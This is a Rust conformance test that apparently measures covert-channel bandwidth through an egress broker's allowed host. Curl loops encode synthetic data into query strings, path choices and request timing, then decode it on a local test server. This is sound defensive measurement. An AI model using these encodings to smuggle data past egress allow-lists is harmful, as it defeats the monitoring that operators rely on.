//! M4 conformance category 11 (covert channels): allowed destinations stay
//! exfiltration channels. This measures, rather than denies, three of them
//! on an allowed terminated host (`methods = ["GET"]`, any path): data in
//! query strings, one bit per request by choice of path, and on-off timing
//! of requests. Bandwidth is reported, never claimed to be zero
//! (Conformance Probe Matrix rule 7; Threat Model Non-Goals).
//!
//! Run on demand: `cargo test -p conformance --test m4_covert -- --ignored --nocapture`.

use conformance::m1::*;
use conformance::*;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

type Log = Arc<Mutex<Vec<(Instant, String, Option<String>)>>>;

fn setup() -> (Harness, HttpsServer, Log, tempfile::TempDir) {
    let ca_dir = tempfile::Builder::new().prefix("bkca.").tempdir_in("/tmp").unwrap();
    let ca = TestCa::new(ca_dir.path());
    let log: Log = Arc::default();
    let l2 = log.clone();
    let h: Handler = Arc::new(move |s: &Seen| {
        l2.lock().unwrap().push((Instant::now(), s.path.clone(), s.query.clone()));
        Reply::new(200, "ok")
    });
    let api = HttpsServer::start(&ca, "allowed.example.com", h);
    let harness = Harness::new(&format!(
        "version = 1\n[tls]\nextra_roots = [\"{}\"]\n{}",
        ca.pem_path.display(),
        loopback_grant("allowed", "allowed.example.com", api.port, "methods = [\"GET\"]")
    ));
    (harness, api, log, ca_dir)
}

#[test]
#[ignore = "measurement; run on demand"]
fn cat11_covert_channel_bandwidth() {
    let (h, api, log, _ca) = setup();
    let base = format!("https://allowed.example.com:{}", api.port);
    let _ = h.sh("true");

    // 1. Query strings: 200 requests × 128 bytes (hex) on one connection.
    let payload: Vec<String> = (0..200u32).map(|i| format!("{:0256x}", (i as u128) * 0x9e37_79b9_7f4a_7c15)).collect();
    let urls: String = payload.iter().map(|p| format!(" -o /dev/null '{base}/q?d={p}'")).collect();
    let t = Instant::now();
    assert_eq!(h.sh(&format!("curl -sS{urls}")).code, 0);
    let q_secs = t.elapsed().as_secs_f64();
    let got: Vec<String> =
        log.lock().unwrap().iter().filter_map(|(_, p, q)| (p == "/q").then(|| q.clone()).flatten()).collect();
    assert_eq!(got.len(), 200, "every query arrived: the channel is open");
    assert!(got.iter().zip(&payload).all(|(g, p)| g == &format!("d={p}")));
    let q_bps = 200.0 * 128.0 / q_secs;

    // 2. Choice of path: one bit per request (/a = 0, /b = 1), 256 bits.
    let bits: Vec<bool> = (0..256).map(|i| (i * 7 + 3) % 5 < 2).collect();
    let urls: String = bits.iter().map(|b| format!(" -o /dev/null '{base}/{}'", if *b { "b" } else { "a" })).collect();
    log.lock().unwrap().clear();
    let t = Instant::now();
    assert_eq!(h.sh(&format!("curl -sS{urls}")).code, 0);
    let c_secs = t.elapsed().as_secs_f64();
    let seen: Vec<bool> = log.lock().unwrap().iter().map(|(_, p, _)| p == "/b").collect();
    assert_eq!(seen, bits, "decoded exactly");
    let c_bps = 256.0 / c_secs / 8.0;

    // 3. Timing: one bit per gap between requests (50 ms = 0, 200 ms = 1).
    let tbits: Vec<bool> = (0..64).map(|i| (i * 5 + 1) % 3 == 0).collect();
    let mut script = format!("curl -sS -o /dev/null '{base}/t'; ");
    for b in &tbits {
        script.push_str(&format!("sleep {}; curl -sS -o /dev/null '{base}/t'; ", if *b { "0.2" } else { "0.05" }));
    }
    log.lock().unwrap().clear();
    let t = Instant::now();
    assert_eq!(h.sh(&script).code, 0);
    let t_secs = t.elapsed().as_secs_f64();
    let arrivals: Vec<Instant> = log.lock().unwrap().iter().filter(|(_, p, _)| p == "/t").map(|(t, ..)| *t).collect();
    assert_eq!(arrivals.len(), tbits.len() + 1);
    let decoded: Vec<bool> =
        arrivals.windows(2).map(|w| w[1].duration_since(w[0]) > Duration::from_millis(125)).collect();
    let errors = decoded.iter().zip(&tbits).filter(|(a, b)| a != b).count();
    let t_bps = tbits.len() as f64 / t_secs / 8.0;

    println!("category 11, allowed terminated host, this machine:");
    println!("  query strings   {:>10.0} bytes/s  (200 × 128 B in {:.2} s, all delivered)", q_bps, q_secs);
    println!("  path choice     {:>10.1} bytes/s  (256 bits in {:.2} s, decoded exactly)", c_bps, c_secs);
    println!("  request timing  {:>10.2} bytes/s  (50/200 ms gaps, {} of {} bits wrong)", t_bps, errors, tbits.len());
    println!("  The broker narrows which hosts, paths and verbs are reachable; it does not close these channels.");
}
